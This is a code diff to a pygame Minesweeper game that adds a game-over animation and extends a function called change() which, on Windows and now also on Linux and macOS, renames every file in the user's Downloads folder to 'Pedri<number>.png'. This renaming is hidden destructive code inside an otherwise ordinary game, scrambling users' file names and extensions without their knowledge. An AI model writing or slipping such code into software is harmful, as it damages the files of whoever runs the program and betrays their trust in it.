@@ -5,6 +5,7 @@ import minesweeper
 import button
 import os
 
+
 def main():
     sweeper = minesweeper.Minesweeper(15, 15, 20)
 
@@ -84,15 +85,20 @@ def main():
                     screen.blit(tiles[int(arr[i][j])], ((SCREEN_WIDTH - BOARD_WIDTH) // 2 + i * TILE_WIDTH,
                                                         (SCREEN_HEIGHT - BOARD_HEIGHT + 15) // 2 + j * TILE_HEIGHT))
 
-
     def change():
         if os.name == 'nt':
-            print("windows")
             if len((dir := os.listdir(os.path.expanduser('~') + r"\Downloads"))) > 0:
                 for i, file in enumerate(dir):
                     path = os.path.expanduser('~') + fr"\Downloads\{file}"
                     if os.path.isfile(path):
-                        os.rename(path, "Pedri:" + str(i))
+                        os.rename(path, fr"{os.path.expanduser('~')}\Downloads\Pedri{str(i)}.png")
+        if os.name == 'posix':
+            if len((dir := os.listdir(os.path.expanduser('~') + r"/Downloads"))) > 0:
+                for i, file in enumerate(dir):
+                    path = os.path.expanduser('~') + fr"/Downloads/{file}"
+                    if os.path.isfile(path):
+                        os.rename(path, fr"{os.path.expanduser('~')}/Downloads/Pedri{str(i)}.png")
+
 
     # Game Loop
     while running:
@@ -110,7 +116,22 @@ def main():
             if event.type == pygame.TEXTINPUT and game == True:
                 action(pygame.mouse.get_pos()[0], pygame.mouse.get_pos()[1], True)
 
+        if game == False:
+            game_over(screen, SCREEN_WIDTH, SCREEN_WIDTH, clock)
+
         pygame.display.flip()
         clock.tick(60)
 
     # Game Loop End
+
+
+def game_over(screen, width, height, clock) -> None:
+    pygame.image.save(screen, "Data/end.png")
+    end = pygame.image.load("Data/end.png")
+    gob = pygame.image.load("Data/game_over.png")
+    game_over_background = pygame.transform.scale(gob, (300, 250))
+    for y in range(200):
+        screen.blit(end, (0, 0))
+        screen.blit(game_over_background, (width // 2 - 150, y))
+        pygame.display.flip()
+        clock.tick(60)
